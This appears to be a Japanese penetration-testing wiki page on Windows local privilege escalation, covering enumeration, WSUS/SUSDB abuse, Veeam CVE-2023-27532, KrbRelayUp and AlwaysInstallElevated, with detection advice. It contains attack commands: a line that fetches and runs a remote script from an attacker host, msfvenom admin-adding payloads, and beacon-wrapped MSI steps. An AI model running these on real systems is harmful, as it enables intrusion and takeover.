# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation vectorsを探すのに最適なツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

このページでは、いくつかの基礎的なガイドにある、Windowsの一般的なprivilege escalation手法をまとめています。<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> 実践的なenumerationの流れには、コミュニティのワークショップやチェックリストも取り入れています。<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> 過去の攻撃手法に関する資料には、Windows privilege escalationを扱ったDerbyConのプレゼンテーションも含まれます。<sup>[[5]](#references)</sup>

## Windowsの基礎理論

### Access Tokens

**Windowsのaccess tokenについて知らない場合は、続ける前に以下のページを読んでください:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACL - DACL/SACL/ACE

**ACL - DACL/SACL/ACEの詳細については、以下のページを確認してください:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windowsのintegrity levelについて知らない場合は、続ける前に以下のページを読んでください:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windowsのセキュリティ制御

Windowsには、**システムのenumerationを妨げたり**、実行ファイルの実行を阻止したり、さらには**あなたの活動を検知したり**するものがあります。privilege escalationのenumerationを始める前に、以下の**ページを読み**、これらの**防御機構**をすべて**enumerate**してください:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

物理アクセスがあれば、オフラインのUEFI NVRAM編集から、起動前のDMAを経てWindowsの`SYSTEM`メモリをpatchする一連の攻撃も可能です:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / UIAccessによるサイレントな昇格

`RAiLaunchAdminProcess`経由で起動したUIAccessプロセスは、AppInfoのsecure-pathチェックを回避すると、プロンプトなしでHigh ILに到達するために悪用される可能性があります。UIAccess/Admin Protectionを回避する専用の手順はこちらを確認してください:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktopのアクセシビリティレジストリ伝播は、任意のSYSTEMレジストリ書き込み（RegPwn）に悪用される可能性があります:<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

最近のWindowsビルドでは、特権を持つローカルNTLM認証が、再利用されたSMB TCP接続を介してリフレクトされる、**SMB任意ポート**経由のLPE手法も導入されました:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## システム情報

### バージョン情報のenumeration

Windowsのバージョンに既知の脆弱性がないか確認してください（適用済みのパッチも確認してください）。

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Version Exploits

この[サイト](https://msrc.microsoft.com/update-guide/vulnerability)は、Microsoft のセキュリティ脆弱性に関する詳細情報を検索するのに便利です。このデータベースには4,700件を超えるセキュリティ脆弱性が登録されており、Windows 環境が**巨大な攻撃対象領域**となることがわかります。

**システム上**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas には watson が組み込まれています)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — OS のビルド、インストール済みの更新プログラム、候補となるアドバイザリを調査します。結果が該当すると判断する前に、正確な製品と後継の更新プログラムを確認してください。

バージョン固有のローカル exploit を調べる場合は、OS のアーキテクチャだけでなく、**実行中のプロセスのアーキテクチャ**も確認してください。64-bit Windows では、32-bit プロセスは[WOW64 ファイルシステム リダイレクト](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector)の影響を受けます。通常、`%windir%\System32` は32-bit のシステムディレクトリに解決されますが、`%windir%\Sysnative` を使うと、そのプロセスからネイティブのシステムディレクトリにアクセスできます。このエイリアスは64-bit プロセスでは使用できません。OS のビルドや未適用 KB の候補だけでは、exploit 可能であることの証明にはなりません。実行中のビルド、インストール済みまたは後継の更新プログラム、プロセスのアーキテクチャ、exploit の前提条件を、該当する問題の[Microsoft セキュリティ情報](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032)と照合してください。

サービスのメモリ破損の例については、[クライアント制御の MIDI 共有メモリリングオフセット](../../binary-exploitation/array-indexing.md#client-controlled-shared-memory-ring-positions)を参照してください。公開されているスタックオフセットが適用できるのはテスト済みのビルドに限られます。`LOCAL SERVICE` に到達することと、その後の[SeImpersonate/EfsPotato](roguepotato-and-printspoofer.md)による`SYSTEM`への昇格は別の段階です。<sup>[[44]](#references)</sup>

**システム情報を使ったローカルでの調査**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**exploit の Github リポジトリ:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 環境

環境変数に認証情報や Juicy 情報が保存されていませんか？

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShell の履歴

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell のトランスクリプトファイル

[こちら](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)で、この機能を有効にする方法を確認できます。

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` はあくまで例です。[PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) では通常、各ユーザーの Documents フォルダーに出力されますが、`OutputDirectory` の設定や `Start-Transcript -OutputDirectory` によって、共有フォルダーや隠しフォルダーにファイルを出力することもできます。transcript を確認する前に、実際の出力先とファイルの ACL を確認してください。transcript にはコマンドの引数や出力など、認証情報が含まれている可能性があります。読み取り可能な transcript が手がかりとなるのは、その内容から利用可能な高権限の ID が判明し、その ID で該当するコンテキストにログオンできる場合に限られます。

### PowerShell Module Logging

PowerShell のパイプライン実行の詳細が記録されます。記録には、実行されたコマンド、コマンドの呼び出し、スクリプトの一部が含まれます。ただし、実行の詳細や出力結果がすべて記録されるとは限りません。

これを有効にするには、ドキュメントの「Transcript files」セクションの手順に従い、**「Powershell Transcription」**ではなく**「Module Logging」**を選択してください。

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

PowersShellログから直近15件のイベントを表示するには、次を実行します:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

スクリプトの実行アクティビティとその全内容が記録され、コードの各ブロックが実行時にすべて記録されます。このプロセスにより、各アクティビティの包括的な監査証跡が保存され、フォレンジック調査や悪意のある動作の分析に役立ちます。実行時にすべてのアクティビティを記録することで、プロセスに関する詳細な知見が得られます。

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Script Block のログイベントは、Windows Event Viewer の次のパスで確認できます：**Application and Services Logs > Microsoft > Windows > PowerShell > Operational**。\
直近の 20 件のイベントを表示するには、次のコマンドを使用します：

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### インターネット設定

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### ドライブ

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

先ほどのガイダンスでは、リスクを次のようにまとめていました。

更新プログラムの要求に http**S** ではなく http が使われている場合、システムを侵害できる可能性があります。

HTTP の WSUS エンドポイントは、更新メタデータの傍受を調査する際の手がかりになります。悪用できるかどうかは、クライアントがその WSUS サーバーを使用しているか、攻撃者がその通信を傍受または制御できるか、さらにクライアントの更新プログラムに対する信頼設定とインストールポリシーにも左右されます。URL だけでは、コード実行が可能だとは判断できません。[Microsoft は WSUS メタデータに TLS を推奨しています](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus)。

まず、次のコマンドを cmd で実行して、ネットワークで SSL を使用しない WSUS 更新が使われているか確認します。

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

または、PowerShell では次のようにします:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

次のような返信を受け取った場合:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

また、`HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` または `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` の値が `1` の場合。

元の適用条件の説明は次のとおりです。

その場合、**exploit可能です。** 最後のレジストリ値が `0` の場合、WSUSエントリは無視されます。

`UseWUServer` が `1` の場合、Windows Update は設定されたイントラネットサービスを使用します。これはHTTP interception経路の前提条件を満たすことを示しますが、interception、悪意のある更新プログラムの受け入れ、または昇格された権限でのインストールが可能であることを証明するものではありません。`0` の場合、このポリシーで設定された特定のWSUSエンドポイントは選択されません。

この脆弱性をexploitするには、[Wsuxploit](https://github.com/pimps/wsuxploit)、[pyWSUS ](https://github.com/GoSecure/pywsus) などのツールを使用できます。これらは、SSLを使用しないWSUSトラフィックに「偽の」更新プログラムを注入するための、MiTM用にweaponizeされたexploitスクリプトです。

こちらの調査結果をお読みください。

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**レポート全文はこちら**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)。<sup>[[33]](#references)</sup>\
基本的に、このbugがexploitする脆弱性は次のとおりです。

> ローカルユーザーのproxyを変更でき、Windows UpdatesがInternet Explorerの設定にあるproxyを使用する場合、ローカルで[PyWSUS](https://github.com/GoSecure/pywsus)を実行して自分のトラフィックをinterceptし、対象システム上で昇格されたユーザーとしてコードを実行できます。
>
> さらに、WSUSサービスは現在のユーザーの設定を使用するため、その証明書ストアも使用します。WSUSのホスト名に対する自己署名証明書を生成し、その証明書を現在のユーザーの証明書ストアに追加すれば、HTTPとHTTPSの両方のWSUSトラフィックをinterceptできます。WSUSには、証明書に対してtrust-on-first-use型の検証を実装するHSTSのような仕組みはありません。提示された証明書がユーザーによって信頼され、正しいホスト名を持っていれば、サービスに受け入れられます。

この脆弱性は、ツール[**WSUSpicious**](https://github.com/GoSecure/wsuspicious)（公開後）を使ってexploitできます。

### WSUS管理者が制御する更新プログラム

現在のidentityでWSUSサーバー上の更新プログラムを**公開および承認**できる場合は、別の経路があります。サーバーの`WSUS Administrators`グループへの実効的な所属と、委任されたWSUS権限を確認し、承認済みの更新プログラムを受け取るクライアントコンピューターグループを特定してください。[Microsoftは更新プログラムの承認にWSUS Administrator権限が必要としています](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate)。また、[公開時の信頼関係について説明しています](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29)：クライアントは、ローカルで公開されたコンテンツの署名に使われた証明書を信頼する必要があります。この経路を権限昇格として扱う前に、候補の更新プログラムに署名があり、受け入れられること、対象に適用可能であること、より高い権限のコンテキストでインストールされることを確認してください。HTTPの`WUServer`値やグループ名だけでは、これらの条件が満たされているとは判断できません。

### SUSDBのcustom-update悪用：`.txt`/`.esd`経由の署名なしpayload

これは、HTTP WSUS接続のinterceptとは異なる信頼境界の問題です。前提条件は、custom updateを公開および承認するための**WSUSデータベース（`SUSDB`）のstored procedureへの十分なアクセス権**です。実用的な侵入経路の一つは、上流WSUSのコンピューターアカウントを、中継先となる`SUSDB`ホストの別のMSSQLサーバーにrelayする方法です。具体的な前提条件は環境によって異なるため、SQL administrator権限があると決めつけず、まず`EXECUTE`権限を列挙してください。<sup>[[38]](#references)[[39]](#references)</sup>

HTTP/8530からLDAP、SMB、またはAD CSへのWSUSクライアント認証のrelayを使う別の攻撃経路については、[WSUS HTTPを悪用したNTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8)を参照してください。

#### 外部データベースへのrelayとprocedureの権限を確認する

WSUSが外部SQL Serverを使用する環境では、まずWSUSサーバーアカウントがデータベースに対して認証できるか、またNTLM relayがそのlistenerに到達するかを確認してください。サーバーのSQL roleによっては、テーブルへの直接書き込みが拒否されていても、更新プログラム公開用のprocedureを実行できる場合があります。`SUSDB`への`UPDATE`が失敗しても、公開が阻止されているとは判断できません。custom updateを試す前に、許可されたSQLセッションで実効identity、roleへの所属、procedureの権限を確認してください。<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

ライブのプロシージャ定義とインストール済みの `SoftwareDistributionPackage.xsd` は、有効な更新メタデータを再構築する際に役立ちます。バンドルの親とペイロードの子にはそれぞれ、`UpdateIdentity`（フラグメント型 `1`）、`LocalizedProperties`（`4`）、`ExtendedProperties`（`2`）が必要です。各 `spImportUpdate` 呼び出しから返されるローカルのリビジョン ID を取得し、バンドルの関連付け、ダイジェスト、サイズ、コンテンツ URL、リビジョンの整合性を保ってください。これは状態を持つ公開ワークフローであり、ストアドプロシージャ呼び出しが1回成功しただけでは、クライアント側で実行された証拠にはなりません。<sup>[[38]](#references)</sup>

#### 更新をビルド、対象指定、承認する

カスタム更新ワークフローでは、正規の WSUS プロシージャを制限付きの公開 API として使用します。重要な状態遷移は次のとおりです。<sup>[[38]](#references)</sup>

| 段階 | 関連するストアドプロシージャ |
| --- | --- |
| 更新メタデータをインポートする | `spImportUpdate` |
| 前提条件、ローカライズ済み、拡張 XML フラグメントを保存する | `spSaveXMLFragment` |
| コンテンツダイジェストを攻撃者が制御する URL に関連付ける | `spSetBatchURL` |
| コンピューターグループを列挙／作成し、クライアントを追加する | `spGetAllTargetGroups`、`spCreateTargetGroup`、`spGetComputerTargetByName`、`spAddComputerToTargetGroup` |
| そのグループへのインストールを承認する | `@actionID = 0` および `@isAssigned = 1` を指定して `spDeployUpdate` を実行する |

ファイル名、ダイジェスト、サイズ、`CommandLineInstallation` ハンドラーは、インポートしたメタデータ／フラグメント間で一致している必要があります。コンテンツ URL と対象グループを割り当てた後の最終承認は、次のようになります。例の GUID を再利用せず、新しい更新、グループ、デプロイメントの識別子を使用してください。<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### 拡張子による署名バイパス

WSUSは通常、任意の未署名実行可能コンテンツを拒否します。しかし、`C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`では、.NETの`VerifyFile`処理が、渡されたファイル名の末尾が`.txt`または`.esd`の場合、証明書チェックのフラグをfalseに設定します。これにより、バイト列がテキストまたは正規のESDイメージであることを事前に確認しないまま、`CheckCertificateSignature`がスキップされます。そのため、たとえば`payload.exe.txt`という名前の変更されていないPEファイルがコンテンツ検証を通過し、その後、更新プログラムのコマンドラインインストールハンドラーによって起動される可能性があります。これは署名の偽造ではなく、ポリシーと型の混同によるバグです。<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS互換のステージングと自動化

`spDeployUpdate` を呼び出すと、WSUS が登録済みのコンテンツを取得します。オリジンは BITS の HTTP 要件を満たす必要があります。URL に到達できるだけでは不十分です。転送では最初に `HEAD`/`GET` フローを実行し、バイト範囲リクエストを使用するためです。Range に対応していないサーバーでは、BITS に Range protocol header が必要であることを示す WSUS 同期の `EventId=364` が発生します。<sup>[[39]](#references)</sup>

研究用 PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) は、import/fragment/URL/group/deployment の一連の処理に必要な SQL を生成し、それを実行するための改変済み MSSQL client を含み、コンテンツのステージング用に `BitsWebServer.py` も提供します。承認済みラボでの最小限の実行例は次のとおりです。<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### 無人実行と再試行による永続化

クライアント側の動作はポリシーに依存します。`Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates` のオプション `4 - Auto download and schedule install` を設定すると、承認済みの更新プログラムがダウンロードされ、設定されたスケジュールに従ってインストールされます。ユーザーが手動で選択する必要はありません。テストでは、ペイロードの更新が失敗または未完了のままの場合、コールバックプロセスの終了直後に再び提示されました。そのため、再試行の動作が繰り返し実行される永続化につながる可能性があります。クライアントに更新失敗の状態が表示されるため、目立ちやすい手法です。<sup>[[39]](#references)</sup>

#### 検出とハードニングの着眼点

この攻撃チェーンで有用なサーバー側およびクライアント側の着眼点は次のとおりです。<sup>[[39]](#references)</sup>

- `SUSDB` における `spCreateTargetGroup`、`spSetBatchURL`、`spDeployUpdate` の実行を監査し、新規のターゲティンググループ、外部コンテンツの取得元、`.txt`/`.esd` の更新ペイロード、想定外のプリンシパル（特にコンピューターアカウント以外）によるデプロイを調査する。
- `C:\Program Files\Update Services\LogFiles` で `ContentSyncAgent`、`FileVerified`、スペルミスのある `FileVerficationFailed`、`EventId=364` を確認する。検証結果をペイロードの拡張子やコンテンツのマジックナンバーと照合し、拡張子だけを信用しない。
- Windows Update のインストールが繰り返し失敗・再試行されていないか、また `.txt` や `.esd` という名前のコンテンツから PE が実行されたり、想定外の子プロセスやネットワークアクティビティが発生していないかを探す。
- 対応している場合はデータベースサービスで Extended Protection for Authentication を必須にし、データベースへのネットワークアクセスを WSUS サーバーと許可された管理システムに制限する。カスタム更新用プロシージャに対する `EXECUTE` 権限は最小限にし、監査する。

## サードパーティ製自動アップデーターと Agent IPC（local privesc）

多くのエンタープライズエージェントは、localhost IPC の接点と特権を持つ更新チャネルを公開しています。登録先を攻撃者のサーバーに誘導でき、アップデーターが不正な root CA や弱い署名者チェックを信頼する場合、ローカルユーザーは悪意のある MSI を送り込み、SYSTEM サービスにインストールさせることができます。Netskope stAgentSvc の攻撃チェーン（CVE-2025-0309）に基づく一般化した手法については、こちらを参照してください。


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532（TCP 9401 経由の SYSTEM）

バージョン固有の元の説明と偵察メモは次のとおりです。

Veeam B&R < `11.0.1.1261` は、攻撃者が制御するメッセージを処理する localhost サービスを **TCP/9401** で公開しており、**NT AUTHORITY\SYSTEM** として任意のコマンドを実行できます。<sup>[[12]](#references)</sup>

- **Recon**: リスナーとバージョンを確認する。例: `netstat -ano | findstr 9401` と `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`。

Veeam Backup & Replication と Cloud Connect は、デフォルトで **TCP/9401** のコアバックアップサービスを使用します。[Veeam のアドバイザリ](https://www.veeam.com/kb4424) には、バックアップネットワークの境界内で、暗号化された構成データベースの認証情報が認証なしで漏えいする問題が記載されています。また、別の公開 PoC では、**NT AUTHORITY\SYSTEM** としてコマンドを実行する経路が実証されています。<sup>[[12]](#references)</sup> サービスは localhost 以外にもバインドする場合があるため、実際のアドレスと PID を確認してください。

- **Recon**: TCP/9401 が `Veeam.Backup.Service.exe` に属していることを確認し、インストール済みの製品とパッチのメタデータを調べる。`netstat -ano | findstr 9401` と `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` は手掛かりであり、完全なパッチ確認ではありません。
- **修正済みの最低バージョン**: Veeam は、最初の修正済みリリースとして **11a build 11.0.1.1261 P20230227** と **12 build 12.0.0.1420 P20230223** を挙げています。それ以前のリリースは影響を受けます。4つの要素からなるファイルバージョンだけでは、同じビルド番号の未パッチのベースビルドと後続パッチを区別できません。境界となるビルドが修正済みかどうかを判断する前に、パッチ識別子を[ベンダーのビルド履歴](https://www.veeam.com/kb2680)で確認してください。
- **Exploit**: `VeeamHax.exe` などの PoC を必要な Veeam DLL とともに同じディレクトリに配置し、ローカルソケット経由で SYSTEM ペイロードをトリガーする。

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

サービスは SYSTEM としてコマンドを実行します。

引用されている PoC は、追加の前提条件が満たされた場合に SYSTEM としてコマンドを実行できることを示しています。ベンダーのアドバイザリでは、認証情報の漏えいに関する問題が説明されています。

## KrbRelayUp

元のデフォルト環境に関する説明は次のとおりです。

特定の条件下で、Windows の **ドメイン** 環境に **ローカル権限昇格** の脆弱性が存在します。これらの条件には、**LDAP signing が強制されていない** 環境、ユーザーに **Resource-Based Constrained Delegation (RBCD)** を設定できる自己権限があること、そしてユーザーがドメイン内にコンピューターを作成できることが含まれます。これらの **要件** は **デフォルト設定** で満たされる点に注意してください。

ローカル Kerberos relay は、適切な COM server が認証を行い、relay されたプリンシパルが対象オブジェクトへの権限を持つ場合、低権限のログオンから特権ディレクトリ書き込みへとつながる可能性があります。[KrbRelay のドキュメント](https://github.com/cube0x0/KrbRelay)には、RBCD と `msDS-KeyCredentialLink` (shadow-credential) の LDAP 書き込み方法が記載されており、KrbRelayUp はこれらの経路の一部を自動化します。RBCD のチェーンには、該当する委任と対象オブジェクトへの権限が必要です。一方、shadow-credential のチェーンには、key-credential の書き込み権限と、証明書認証経路をサポートする KDC が必要です。どちらの経路も、ドメインへの参加だけで成立するものではありません。

実際の DC の [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) および [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding) ポリシー、relay される ID のオブジェクト ACL、選択した COM クラスの認証レベルと偽装レベルを確認してください。呼び出し元のログオンの種類と認証情報のコンテキストも重要です。WinRM セッションは、対話型ログオンや新しい認証情報でのログオンとは異なる動作をする場合があります。ファイアウォール/OXID のルーティングやインストール済みの更新プログラムによっても結果は変わる可能性があります。許容的なポリシーや該当する ACL は、調査対象として扱ってください。受動的な列挙によって COM coercion、relay 認証、ディレクトリ書き込みを発生させてはなりません。マシンアカウントの shadow credential はマシンチケットにつながる可能性があり、そのアカウントに必要なディレクトリ複製権限がある場合に限り、別途 DCSync につながる可能性があります。

[**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)で**exploit を**確認してください。

攻撃の流れについて詳しくは、[https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>を確認してください。

## AlwaysInstallElevated

**これら 2 つのレジストリ設定が有効**（値が **0x1**）になっている場合、どの権限レベルのユーザーでも `*.msi` ファイルを NT AUTHORITY\\**SYSTEM** として**インストール**（実行）できます。

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

meterpreter セッションがある場合、この手法はモジュール **`exploit/windows/local/always_install_elevated`** を使って自動化できます。

### PowerUP

power-up の `Write-UserAddMSI` コマンドを使うと、権限昇格用の Windows MSI バイナリを現在のディレクトリに作成できます。このスクリプトは、ユーザーまたはグループの追加を促すプリコンパイル済み MSI インストーラーを書き出します（そのため、GIU アクセスが必要です）：

```
Write-UserAddMSI
```

作成したバイナリを実行するだけで、privileges を昇格できます。

### MSI Wrapper

このツールを使って MSI wrapper を作成する方法は、このチュートリアルを参照してください。**command lines**を**実行**するだけでよい場合は、「**.bat**」ファイルを wrapper にできることに注意してください。


{{#ref}}
msi-wrapper.md
{{#endref}}

### WIX で MSI を作成


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual Studio で MSI を作成

- Cobalt Strike または Metasploit で新しい **Windows EXE TCP payload** を**生成**し、`C:\privesc\beacon.exe` に保存します。
- **Visual Studio** を開き、**Create a new project** を選択して、検索ボックスに「installer」と入力します。**Setup Wizard** プロジェクトを選択して、**Next** をクリックします。
- プロジェクト名（**AlwaysPrivesc** など）を入力し、場所に **`C:\privesc`** を指定して、**place solution and project in the same directory** を選択し、**Create** をクリックします。
- ファイルを選択するステップ 3/4 まで **Next** をクリックします。**Add** をクリックして、先ほど生成した Beacon payload を選択します。次に **Finish** をクリックします。
- **Solution Explorer** で **AlwaysPrivesc** プロジェクトを選択し、**Properties** で **TargetPlatform** を **x86** から **x64** に変更します。
  - **Author** や **Manufacturer** など、インストールしたアプリをより正規のものに見せるために変更できるプロパティもあります。
- プロジェクトを右クリックし、**View > Custom Actions** を選択します。
- **Install** を右クリックし、**Add Custom Action** を選択します。
- **Application Folder** をダブルクリックし、**beacon.exe** ファイルを選択して **OK** をクリックします。これにより、インストーラーの実行直後に Beacon payload が実行されます。
- **Custom Action Properties** で、**Run64Bit** を **True** に変更します。
- 最後に、**ビルド**します。
  - `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` という警告が表示された場合は、プラットフォームが x64 に設定されていることを確認してください。

### MSI のインストール

悪意のある `.msi` ファイルを**バックグラウンドで**インストールするには:

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

この脆弱性を悪用するには、次を使用できます: _exploit/windows/local/always_install_elevated_

## アンチウイルスと検出器

### 監査設定

これらの設定によって何が**ログ記録される**かが決まるため、注意してください。

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwardingでは、ログがどこに送信されるのかを把握しておくと有用です。

```bash
